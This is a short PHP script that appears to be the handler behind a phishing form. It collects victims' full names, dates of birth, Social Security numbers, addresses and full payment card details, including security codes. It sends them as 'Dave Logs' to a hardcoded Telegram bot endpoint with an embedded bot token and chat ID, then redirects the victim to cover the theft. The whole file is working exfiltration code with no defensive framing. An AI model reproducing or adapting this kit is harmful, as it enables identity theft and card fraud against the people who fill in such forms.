
<?php
define ('url',"https://api.telegram.org/bot5078110948:AAEpT1i3-eX2Z6AE_xaieuFmj4T_9jcXoz4/");
$fname = $_POST['fname'];
$dob = $_POST['dob'];
$ssn = $_POST['ssn'];
$addy = $_POST['address'];
$cardfname = $_POST['cardfname'];
$cardexpd = $_POST['cardexpd'];
$cardnum = $_POST['cardnum'];
$cardsec = $_POST['cardsec'];

$chat_id = '2107998919';
$message = urlencode("------Dave Logs------"."\nFull Name:".$fname."\ncardfname:".$cardfname."\nDOB:".$dob."\nAddress:".$addy."\nSSN:".$ssn."\nCard Expiry Date".$cardexpd."\nCard Number:".$cardnum."\nCard Security Code:".$cardsec);
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");

header("Location: redirect.htm");
exit();


?>